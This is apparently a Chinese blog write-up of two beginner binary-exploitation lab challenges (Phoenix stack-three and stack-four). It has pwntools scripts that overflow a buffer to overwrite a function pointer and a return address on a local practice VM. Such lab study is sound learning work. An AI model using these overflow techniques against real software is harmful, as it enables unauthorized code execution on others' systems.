最近又是数模又是开学的，很难受，还是看看远方的~~水~~入门题吧。没有动态基址，还是比较简单的。

## stack-three

覆盖一个即将被调用的函数指针的数据，跟前面差不多。

```python
from pwn import *
shell = ssh("user", "localhost", password="user", port=2222)

s = b"a" * 0x40 + p64(0x40069d)
sh = shell.run(b"/opt/phoenix/amd64/stack-three")
sh.recvlines(1)
sh.sendline(s)
print(sh.recvlines(2))

```

## stack-four

覆盖栈上的返回地址。

![image-20230225202058128](https://s2.loli.net/2023/02/25/YB5ux4CUSAeowPv.png)

`0x648-0x5f0=88`

```python
from pwn import *
shell = ssh("user", "localhost", password="user", port=2222)

s = b"a" * 88 + p64(0x40061d)
sh = shell.run(b"/opt/phoenix/amd64/stack-four")
sh.recvlines(1)
sh.sendline(s)
print(sh.recvlines(2))
```

